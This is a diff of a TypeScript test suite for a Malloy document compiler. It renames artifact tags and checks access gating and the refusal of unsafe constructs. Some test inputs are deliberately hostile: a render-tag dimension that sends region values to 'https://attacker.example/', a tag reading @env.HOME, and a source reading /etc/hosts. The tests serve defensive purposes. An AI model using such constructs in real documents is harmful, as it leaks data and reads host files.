@@ -40,7 +40,7 @@ const tilesOf = (result: { document?: CompiledDocument }) =>
 
 const MODEL = `##! experimental.givens
 ## base note, which a document must never inherit
-## artifact { kind=dashboard title="Base" }
+## artifact { layout=grid title="Base" }
 
 given:
   ROLE :: string
@@ -65,7 +65,7 @@ source: open_src is duckdb.sql("SELECT 1 as x, 'w' as region") extend {
 run: open_src -> { aggregate: c }
 `;
 
-const DOC_TILES = `## artifact { kind=dashboard tiles=["open_src -> v", "gated -> v"] }
+const DOC_TILES = `## artifact { layout=grid tiles=["open_src -> v", "gated -> v"] }
 `;
 
 describe("compile of a document (compileSource)", () => {
@@ -109,7 +109,7 @@ describe("compile of a document (compileSource)", () => {
 
       it("reads only the submitted text: the base's run: and ## notes never join the document", async () => {
          const { problems, document } = await compile(
-            `## artifact { kind=notebook }
+            `## artifact { layout=linear }
 ##(markdown) Hello
 run: open_src -> { aggregate: c }
 `,
@@ -141,12 +141,12 @@ run: open_src -> { aggregate: c }
          ).toBe("notebook");
          expect(
             await kindOf(
-               `## artifact { kind=notebook tiles=["open_src -> v"] }\n`,
+               `## artifact { layout=linear tiles=["open_src -> v"] }\n`,
             ),
          ).toBe("notebook");
          expect(
             await kindOf(
-               `## artifact { kind=dashboard }\nrun: open_src -> { aggregate: c }\n`,
+               `## artifact { layout=grid }\nrun: open_src -> { aggregate: c }\n`,
             ),
          ).toBe("dashboard");
          const dashboard = await compile(
@@ -157,7 +157,7 @@ run: open_src -> { aggregate: c }
 
       it("reads the control row off the compiled tiles and does not run anything", async () => {
          const result = await compile(
-            `## artifact { kind=dashboard tiles=["open_src -> v"] }\n`,
+            `## artifact { layout=grid tiles=["open_src -> v"] }\n`,
          );
          expect(tilesOf(result)[0].givenNames).toEqual(["REGION"]);
          expect(manifestOf(result).givens?.map((g) => g.name)).toEqual([
@@ -167,7 +167,7 @@ run: open_src -> { aggregate: c }
 
       it("marks a #(secure) given so a host can withhold its control", async () => {
          const result = await compile(
-            `## artifact { kind=dashboard tiles=["open_src -> sv"] }\n`,
+            `## artifact { layout=grid tiles=["open_src -> sv"] }\n`,
          );
          const row = manifestOf(result).givens ?? [];
          expect(row.map((g) => [g.name, g.secure])).toEqual([["TENANT", true]]);
@@ -214,7 +214,7 @@ run: open_src -> { aggregate: c }
       });
 
       it("a non-member's gated cell is restricted and its diagnostics do not exist", async () => {
-         const text = `## artifact { kind=notebook }
+         const text = `## artifact { layout=linear }
 run: open_src -> { aggregate: c }
 run: gated -> { select: no_such_column_in_gated }
 `;
@@ -229,7 +229,7 @@ run: gated -> { select: no_such_column_in_gated }
       });
 
       it("restriction follows a derived name: a source defined from a gated one taints its readers", async () => {
-         const text = `## artifact { kind=notebook }
+         const text = `## artifact { layout=linear }
 source: derived is gated extend { measure: n is count() }
 run: derived -> { aggregate: n }
 run: open_src -> { aggregate: c }
@@ -246,7 +246,7 @@ run: open_src -> { aggregate: c }
       it("text that does not parse is refused by the construct gate once every cell has been judged", async () => {
          await expect(
             compile(
-               `## artifact { kind=notebook }\nrun: open_src -> { aggregate: c }\nthis is not malloy\n`,
+               `## artifact { layout=linear }\nrun: open_src -> { aggregate: c }\nthis is not malloy\n`,
             ),
          ).rejects.toBeInstanceOf(CompileRefusedError);
       });
@@ -293,7 +293,7 @@ source: secured is duckdb.sql("SELECT 'acme' AS tenant, 1 AS x") extend {
          it(`refuses a tile over ${root}, so no givenNames or givens row can answer for it`, async () => {
             await expect(
                compile(
-                  `## artifact { kind=dashboard tiles=["${root} -> { select: region }"] }\n`,
+                  `## artifact { layout=grid tiles=["${root} -> { select: region }"] }\n`,
                   { ROLE: "analyst" },
                ),
             ).rejects.toBeInstanceOf(CompileRefusedError);
@@ -302,7 +302,7 @@ source: secured is duckdb.sql("SELECT 'acme' AS tenant, 1 AS x") extend {
          it(`the whole-text gate refuses a cell over ${root}`, async () => {
             await expect(
                compile(
-                  `## artifact { kind=notebook }\nrun: ${root} -> { select: region }\n`,
+                  `## artifact { layout=linear }\nrun: ${root} -> { select: region }\n`,
                   { ROLE: "analyst" },
                ),
             ).rejects.toBeInstanceOf(CompileRefusedError);
@@ -312,7 +312,7 @@ source: secured is duckdb.sql("SELECT 'acme' AS tenant, 1 AS x") extend {
       it("the whole-text gate refuses a definition cell that declares a root, so the tile over it never compiles", async () => {
          await expect(
             compile(
-               `## artifact { kind=dashboard tiles=["d -> v"] }\nsource: d is duckdb.table('/etc/hosts') extend { view: v is { select: * } }\n`,
+               `## artifact { layout=grid tiles=["d -> v"] }\nsource: d is duckdb.table('/etc/hosts') extend { view: v is { select: * } }\n`,
             ),
          ).rejects.toBeInstanceOf(CompileRefusedError);
       });
@@ -320,7 +320,7 @@ source: secured is duckdb.sql("SELECT 'acme' AS tenant, 1 AS x") extend {
       it("refuses a definition cell that turns a value into a URL with a render tag", async () => {
          await expect(
             compile(
-               `## artifact { kind=dashboard tiles=["leaky -> v"] }\nsource: leaky is open_src extend {\n  dimension: # image\n    pic is concat('https://attacker.example/?', region)\n  view: v is { group_by: pic }\n}\n`,
+               `## artifact { layout=grid tiles=["leaky -> v"] }\nsource: leaky is open_src extend {\n  dimension: # image\n    pic is concat('https://attacker.example/?', region)\n  view: v is { group_by: pic }\n}\n`,
                { ROLE: "analyst" },
             ),
          ).rejects.toBeInstanceOf(CompileRefusedError);
@@ -329,7 +329,7 @@ source: secured is duckdb.sql("SELECT 'acme' AS tenant, 1 AS x") extend {
       it("refuses a definition cell whose render tag reads the environment, which hides the tag from a plain parse", async () => {
          await expect(
             compile(
-               `## artifact { kind=dashboard tiles=["leaky -> v"] }\nsource: leaky is open_src extend {\n  dimension:\n  # image=@env.HOME\n  pic is region\n  view: v is { group_by: pic }\n}\n`,
+               `## artifact { layout=grid tiles=["leaky -> v"] }\nsource: leaky is open_src extend {\n  dimension:\n  # image=@env.HOME\n  pic is region\n  view: v is { group_by: pic }\n}\n`,
                { ROLE: "analyst" },
             ),
          ).rejects.toBeInstanceOf(CompileRefusedError);
@@ -337,7 +337,7 @@ source: secured is duckdb.sql("SELECT 'acme' AS tenant, 1 AS x") extend {
 
       it("keeps a document whose cell carries the documented bare filter literal in a starting-value tag", async () => {
          const result = await compile(
-            `## artifact { kind=notebook }\n# artifact { autorun=false givens { REGION=f'US' } }\nrun: open_src -> { aggregate: c }\n`,
+            `## artifact { layout=linear }\n# artifact { autorun=false givens { REGION=f'US' } }\nrun: open_src -> { aggregate: c }\n`,
             { ROLE: "analyst" },
          );
          expect(result.document?.cells.map((c) => c.kind)).toEqual(["query"]);
@@ -345,7 +345,7 @@ source: secured is duckdb.sql("SELECT 'acme' AS tenant, 1 AS x") extend {
 
       it("leaves an ordinary tile's givens exactly as they were", async () => {
          const result = await compile(
-            `## artifact { kind=dashboard tiles=["open_src -> v"] }\n`,
+            `## artifact { layout=grid tiles=["open_src -> v"] }\n`,
          );
          expect(tilesOf(result)[0].givenNames).toEqual(["REGION"]);
          expect(manifestOf(result).givens?.map((g) => g.name)).toEqual([
@@ -372,7 +372,7 @@ source: secured is duckdb.sql("SELECT 'acme' AS tenant, 1 AS x") extend {
          harness.collectCounter("publisher_compile_refusals_total", { reason });
       const refusals = () => refusalsFor("restricted_construct");
       const tiles = (...expressions: string[]) =>
-         `## artifact { kind=dashboard tiles=[${expressions
+         `## artifact { layout=grid tiles=[${expressions
             .map((e) => `"${e}"`)
             .join(", ")}] }\n`;
       const refusalOf = async (source: string) => {
@@ -428,7 +428,7 @@ source: secured is duckdb.sql("SELECT 'acme' AS tenant, 1 AS x") extend {
       it("counts a render-tag refusal apart from a restricted construct, in a definition cell and in a tile", async () => {
          await expect(
             compile(
-               `## artifact { kind=dashboard tiles=["leaky -> v"] }\nsource: leaky is open_src extend {\n  dimension:\n  # image=@env.HOME\n  pic is region\n  view: v is { group_by: pic }\n}\n`,
+               `## artifact { layout=grid tiles=["leaky -> v"] }\nsource: leaky is open_src extend {\n  dimension:\n  # image=@env.HOME\n  pic is region\n  view: v is { group_by: pic }\n}\n`,
             ),
          ).rejects.toBeInstanceOf(CompileRefusedError);
          expect(await refusalsFor("render_tag")).toBe(1);
@@ -475,7 +475,7 @@ source: secured is duckdb.sql("SELECT 'acme' AS tenant, 1 AS x") extend {
 
       it("blanks a restricted cell written with CRLF line endings", async () => {
          const { document, problems } = await compile(
-            `## artifact { kind=notebook }\r\nrun: gated -> {\r\n  select: no_such_column_in_gated\r\n}\r\nrun: open_src -> { aggregate: c }\r\n`,
+            `## artifact { layout=linear }\r\nrun: gated -> {\r\n  select: no_such_column_in_gated\r\n}\r\nrun: open_src -> { aggregate: c }\r\n`,
             { ROLE: "nobody" },
          );
          expect(problems).toEqual([]);
@@ -487,7 +487,7 @@ source: secured is duckdb.sql("SELECT 'acme' AS tenant, 1 AS x") extend {
 
       it("blanks a restricted cell together with its annotations", async () => {
          const { document, problems } = await compile(
-            `## artifact { kind=notebook }\n#(markdown) About the gated total\n# label="Gated"\nrun: gated -> { select: no_such_column_in_gated }\nrun: open_src -> { aggregate: c }\n`,
+            `## artifact { layout=linear }\n#(markdown) About the gated total\n# label="Gated"\nrun: gated -> { select: no_such_column_in_gated }\nrun: open_src -> { aggregate: c }\n`,
             { ROLE: "nobody" },
          );
          expect(problems).toEqual([]);
@@ -499,7 +499,7 @@ source: secured is duckdb.sql("SELECT 'acme' AS tenant, 1 AS x") extend {
 
       it("taints every name of a multi-item declaration", async () => {
          const { document } = await compile(
-            `## artifact { kind=notebook }\nsource: a is gated extend { }\nsource: b is gated extend { }, c is open_src extend { }\nrun: b -> { aggregate: c }\nrun: c -> { aggregate: c }\n`,
+            `## artifact { layout=linear }\nsource: a is gated extend { }\nsource: b is gated extend { }, c is open_src extend { }\nrun: b -> { aggregate: c }\nrun: c -> { aggregate: c }\n`,
             { ROLE: "nobody" },
          );
          // `c` reads an open source, but its statement is blanked with `b`, so `c` no longer exists to read.
@@ -513,7 +513,7 @@ source: secured is duckdb.sql("SELECT 'acme' AS tenant, 1 AS x") extend {
 
       it("taints a parameterized declaration's name", async () => {
          const { document } = await compile(
-            `## artifact { kind=notebook }\nsource: p(n::number is 1) is gated extend { }\nrun: p(n is 2) -> { aggregate: c }\nrun: open_src -> { aggregate: c }\n`,
+            `## artifact { layout=linear }\nsource: p(n::number is 1) is gated extend { }\nrun: p(n is 2) -> { aggregate: c }\nrun: open_src -> { aggregate: c }\n`,
             { ROLE: "nobody" },
          );
          expect(document?.cells.map((c) => c.restricted)).toEqual([
@@ -531,7 +531,7 @@ source: secured is duckdb.sql("SELECT 'acme' AS tenant, 1 AS x") extend {
 
       it("blanks only the restricted statement, so an open one on its line still compiles", async () => {
          const { document, problems } = await compile(
-            `## artifact { kind=notebook }\nsource: d is gated extend { } run: open_src -> {\n  aggregate: c\n}\n`,
+            `## artifact { layout=linear }\nsource: d is gated extend { } run: open_src -> {\n  aggregate: c\n}\n`,
             { ROLE: "nobody" },
          );
          expect(problems.filter((p) => p.code === "syntax-error")).toEqual([]);
@@ -543,7 +543,7 @@ source: secured is duckdb.sql("SELECT 'acme' AS tenant, 1 AS x") extend {
 
       it("taints the statement's own name and not the fields declared inside it", async () => {
          const { document } = await compile(
-            `## artifact { kind=notebook }\nsource: d is gated extend { measure: n is count() }\nrun: open_src -> { aggregate: n is count() }\nrun: d -> { aggregate: n }\n`,
+            `## artifact { layout=linear }\nsource: d is gated extend { measure: n is count() }\nrun: open_src -> { aggregate: n is count() }\nrun: d -> { aggregate: n }\n`,
             { ROLE: "nobody" },
          );
          expect(document?.cells.map((c) => c.restricted)).toEqual([
@@ -555,7 +555,7 @@ source: secured is duckdb.sql("SELECT 'acme' AS tenant, 1 AS x") extend {
 
       it("taints a backtick-quoted name", async () => {
          const { document, problems } = await compile(
-            `## artifact { kind=notebook }\nsource: \`d x\` is gated extend { }\nrun: \`d x\` -> { select: x }\nrun: open_src -> { aggregate: c }\n`,
+            `## artifact { layout=linear }\nsource: \`d x\` is gated extend { }\nrun: \`d x\` -> { select: x }\nrun: open_src -> { aggregate: c }\n`,
             { ROLE: "nobody" },
          );
          expect(problems).toEqual([]);
@@ -591,7 +591,7 @@ source: secured is duckdb.sql("SELECT 'acme' AS tenant, 1 AS x") extend {
 
       it("makes the text a document, as it is when the file is saved", async () => {
          const { document } = await compile(
-            `run: open_src -> { aggregate: c } ## artifact { kind=dashboard tiles=["open_src -> v"] }\n`,
+            `run: open_src -> { aggregate: c } ## artifact { layout=grid tiles=["open_src -> v"] }\n`,
             { ROLE: "analyst" },
          );
          expect(document?.kind).toBe("dashboard");
@@ -601,9 +601,8 @@ source: secured is duckdb.sql("SELECT 'acme' AS tenant, 1 AS x") extend {
 
    describe("a tile over a name the viewer cannot confirm", () => {
       beforeEach(async () => {
-         await install(
-            {
-               "index.malloy": `##! experimental.givens
+         await install({
+            "index.malloy": `##! experimental.givens
 given:
   ROLE :: string
 source: customers is duckdb.sql("select 1 as id") extend {
@@ -621,9 +620,7 @@ source: locked_hidden is duckdb.sql("select 1 as id") extend {
 }
 export { customers }
 `,
-            },
-            { explores: ["index.malloy"] },
-         );
+         });
       });
 
       const refusal = async (
@@ -663,7 +660,7 @@ export { customers }
                await env.compileSource(
                   "pkg",
                   "index.malloy",
-                  `## artifact { kind=notebook }\nrun: ${name} -> { select: y is f!number(id) }\n`,
+                  `## artifact { layout=linear }\nrun: ${name} -> { select: y is f!number(id) }\n`,
                   false,
                   givens,
                );
@@ -746,9 +743,8 @@ export { customers }
 
    describe("query boundary", () => {
       beforeEach(async () => {
-         await install(
-            {
-               "index.malloy": `source: helper is duckdb.sql("select 1 as id") extend {
+         await install({
+            "index.malloy": `source: helper is duckdb.sql("select 1 as id") extend {
   measure: c is count()
   view: hv is { aggregate: c }
 }
@@ -758,9 +754,7 @@ source: customers is duckdb.sql("select 1 as id") extend {
 }
 export { customers }
 `,
-            },
-            { explores: ["index.malloy"] },
-         );
+         });
       });
 
       it("refuses a document whose tile targets a source off the surface, so a compile that passes also runs", async () => {
@@ -786,7 +780,7 @@ export { customers }
          const cell = await env.compileSource(
             "pkg",
             "index.malloy",
-            `## artifact { kind=notebook }\nsource: h2 is helper extend { }\nrun: h2 -> { aggregate: c }\n`,
+            `## artifact { layout=linear }\nsource: h2 is helper extend { }\nrun: h2 -> { aggregate: c }\n`,
          );
          expect(cell.document).toBeUndefined();
          expect(cell.problems.map((p) => p.code)).toEqual([
@@ -808,7 +802,7 @@ export { customers }
          const cell = await env.compileSource(
             "pkg",
             "index.malloy",
-            `## artifact { kind=notebook }\n${definition}run: j -> { group_by: st.id }\n`,
+            `## artifact { layout=linear }\n${definition}run: j -> { group_by: st.id }\n`,
          );
          expect(cell.document).toBeUndefined();
          expect(cell.problems.map((p) => p.code)).toEqual([
@@ -875,7 +869,7 @@ source: t is duckdb.sql("select 1 as a") extend {
          return await compileDocument({
             base: runtime.loadModel(new URL(url)),
             source:
-               '## artifact { kind=notebook tiles=["s -> v", "t -> v"] }\n',
+               '## artifact { layout=linear tiles=["s -> v", "t -> v"] }\n',
             modelName: "model.malloy",
             gates: {
                text: async () => {},
